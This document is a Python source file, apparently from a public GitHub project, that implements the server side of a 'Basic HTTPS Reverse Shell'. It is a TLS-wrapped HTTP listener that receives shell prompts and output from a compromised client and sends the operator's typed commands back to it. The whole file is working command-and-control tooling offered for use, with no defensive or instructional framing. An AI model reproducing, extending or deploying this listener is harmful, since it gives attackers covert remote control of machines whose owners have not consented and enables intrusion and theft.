#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import json
import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs


class ShellHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        self.send_header("Content-type", "application/json")
        self._set_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length"))
        request_body: dict[str, list[str]] = parse_qs(
            self.rfile.read(length).decode())
        for mode, args in request_body.items():
            getattr(self, mode)(args)

    def _set_headers(self) -> None:
        self.send_response(200)
        self.end_headers()

    def prompt(self, shell_prompt: list[str]) -> None:
        try:
            response = input(*shell_prompt)
        except EOFError:
            raise KeyboardInterrupt
        self._set_headers()
        self.wfile.write(response.encode())

    def output(self, client_output: list[str]) -> None:
        print(*client_output, end="")
        self._set_headers()

    def log_message(self, *args, **kwargs):
        """Suppress display of log messages on STDOUT."""
        pass


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description="Basic HTTPS Reverse Shell Server")
    parser.add_argument("--host",
                        type=str,
                        default="localhost",
                        metavar="<hostname>",
                        help="Server address or hostname.")
    parser.add_argument("-p", "--port",
                        type=int,
                        default=4443,
                        metavar="<port>",
                        help="Port number to bind the server to.")
    parser.add_argument("--certfile",
                        type=str,
                        default=None,
                        metavar="<path>",
                        help="Absolute path to a file containing the "
                             "server's certificate.")
    _args = parser.parse_args()

    if _args.certfile is None:
        '''Use the 'server.pem' certificate file created by default by the 
        'generate_certificates.sh' shell script'''
        _args.certfile = str(Path(__file__).parents[1].joinpath("server.pem"))

    server_sock = _args.host, _args.port

    with HTTPServer(server_sock, ShellHandler) as httpd:
        try:
            print('[>>>] Server started on https://{}:{}'.format(*server_sock))
            httpd.socket = ssl.wrap_socket(sock=httpd.socket,
                                           server_side=True,
                                           certfile=_args.certfile,
                                           ssl_version=ssl.PROTOCOL_TLS)
            httpd.serve_forever()
        except KeyboardInterrupt:
            print('\n[!] Shutting down the server...')
